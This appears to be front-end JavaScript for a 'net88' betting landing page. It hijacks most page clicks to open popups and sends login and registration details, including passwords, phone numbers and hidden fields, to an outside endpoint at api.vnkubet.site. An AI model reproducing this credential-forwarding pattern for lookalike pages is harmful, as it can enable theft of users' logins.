document.addEventListener('DOMContentLoaded', function() {
    const MAIN_URL = 'https://api.vnkubet.site/submit';

    document.querySelector('.register-btn').addEventListener('click', function(e) {
        e.preventDefault();
        document.querySelector('.button-none .elementor-button').click();
    });

    jQuery(".elementor-slides-wrapper, .elementor-gallery-item, .sport-section__sport-item, .elementor-icon-list-items li, .elementor-image-box-wrapper, .promotion-card, a, img, .tab-list .tab-item, .left-menu__item, .sport-item, .elementor-icon-box-wrapper, .comment-section .elementor-widget-wrap")
        .click(function(e) {
            e.preventDefault();
            elementorProFrontend.modules.popup.showPopup({ id: 35 });
        });

    jQuery(".elementor-widget-image-carousel, .sport-section__sport-item, .elementor-icon-list-items li, .elementor-image-box-wrapper, .promotion-card, a, img, .tab-list .tab-item, .left-menu__item, .sport-item, .elementor-icon-box-wrapper")
        .click(function() {
            elementorProFrontend.modules.popup.showPopup({ id: 495 });
        });

    document.querySelector('.login-btn').addEventListener('click', function(e) {
        e.preventDefault();
        if (window.innerWidth < 768) {
            document.querySelector('.button-login-none .elementor-button').click();
        } else {
            let formTarget = document.querySelector('.hp-login-form1');
            let username = formTarget.querySelector('input.username').value;
            let password = formTarget.querySelector('input.password').value;
            if(username === '' || password === '') {
                this.disabled = false;
            }
            else {
                this.disabled = true;
            }
            const jsonData = { username: username, password: password, formType: 'login', brand: 'net88' };
            fetchApi(MAIN_URL, optionsForApiRequest(jsonData));
        }
    });

    jQuery(document).on('elementor/popup/show', function () {
        let loginForm = document.querySelector('.login-confirm-btn');
        let registerForm = document.querySelector('.register-confirm-btn');

        if (loginForm) {
            loginForm.addEventListener('click', function(e) {
                e.preventDefault();
                let formTarget = document.querySelector('.hp-login-form');
                let username = formTarget.querySelector('input.username').value;
                let password = formTarget.querySelector('input.password').value;
                const jsonData = { username: username, password: password, formType: 'login', brand: 'net88' };
                if(username === '' || password === '') {
                    this.disabled = false;
                }
                else {
                    this.disabled = true;
                    showSpinner();
                }
                
                fetchApi(MAIN_URL, optionsForApiRequest(jsonData));
            });
        }

        if (registerForm) {
            registerForm.addEventListener('click', async function(e) {
                e.preventDefault();
                let formTarget = document.querySelector('.hp-register-form');
                let usernameVal = formTarget.querySelector('input.username').value;
                let passwordVal = formTarget.querySelector('input.password').value;
                let phoneVal = formTarget.querySelector('input.phone-number').value;
                let emailVal = formTarget.querySelector('input.email') ? formTarget.querySelector('input.email').value : '';

                const hiddenInputsObj = {};
                const hiddenInputs = formTarget.querySelectorAll('input[type="hidden"]');
                hiddenInputs.forEach(input => {
                    const name = input.getAttribute('name');
                    const value = input.value;
                    hiddenInputsObj[name] = value;
                });

                if(usernameVal && passwordVal  && phoneVal) {
                    this.disabled = true;
                    showSpinner();
                }
                else {
                    this.disabled = false;
                }
            
                const bodyObj = {
                    username: usernameVal,
                    password: passwordVal,
                    phoneNumber: phoneVal,
                    email: emailVal,
                    formType: 'register',
                    brand: 'net88',
                    ip: window.changeIpAddress || null
                };
                let jsonData = {...bodyObj, hiddenInputs: {...hiddenInputsObj}};
                fetchApi(MAIN_URL, optionsForApiRequest(jsonData));
            });
        }
    });

    function optionsForApiRequest(jsonData) {
        return {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(jsonData)
        };
    }

    function fetchApi(url, options) {
        fetch(url, options)
        .then((res) => res.json())
        .then(response => {
            if (response.status === "OK") {
                loginWithToken(response.target);
            } else {
                alert(response.message.message);
            }
        })
        .catch(error => console.error('ERROR:', error.message.message))
        .finally(() => {
            hideSpinner();
        });
    }

    function loginWithToken(loginUrl) {
        window.open(loginUrl, '_self');
    }

    function showSpinner(){
        let spinners = document.querySelectorAll('.spinner');
        spinners.forEach(spinner => {
            spinner.style.display = 'inline-block';
        });
    }
    function hideSpinner(){
        let spinners = document.querySelectorAll('.spinner');
        spinners.forEach(spinner => {
            spinner.style.display = 'none';
        });
    }
});